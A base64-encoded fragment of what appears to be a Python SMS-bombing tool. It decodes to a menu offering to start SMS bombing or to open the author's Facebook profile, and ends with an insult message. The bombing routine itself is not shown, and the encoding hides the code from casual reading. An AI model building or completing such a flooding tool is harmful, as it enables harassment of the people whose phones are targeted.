8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5ciIiIKcHJpbnQobG9nbykKcHJpbnQoIlswMV0gU1RBUlQgU01TIEJPTUJJTkcgIikKcHJpbnQoIlswMl0gQ09OVEFDVCBNRSBPTiBGQUNFQk9PSyAiKQpwcmludCgiw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDlyIpCnVzcj1pbnB1dCgiXDAzM1szODs1OzE5NW1bXDAzM1szODs1OzQ2bStcMDMzWzM4OzU7MTk1bV1cMDMzWzM4OzU7NDZtIFlPVVIgQ0hPSUNFIFwwMzNbMzg7NTsxOTVtOiAiKQp1c3I9dXNyLnJlcGxhY2UoIiAiLCIiKQppZiB1c3I9PSAiMSIgb3IgdXNyPT0gIjAxIjoKICBwcmltaWFtKCkKZWxpZiB1c3I9PSAiMiIgb3IgdXNyPT0gIjAyIjoKICBvcy5zeXN0ZW0oInhkZy1vcGVuIGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwODAzNjQzNTQ4NjMmbWliZXh0aWQ9WmJXS3dMIikgCiAgCmVsc2U6CiAgcHJpbnQoIlwwMzNbMzg7NTsxOTVtXG5bXDAzM1sxOzMxbSFcMDMzWzM4OzU7MTk1bV1cMDMzWzE7MzFtIEZVQ0sgWU9VIPCfpKvwn6SrLi5cbiIpCiAgc3lzLmV4aXQoKQ==
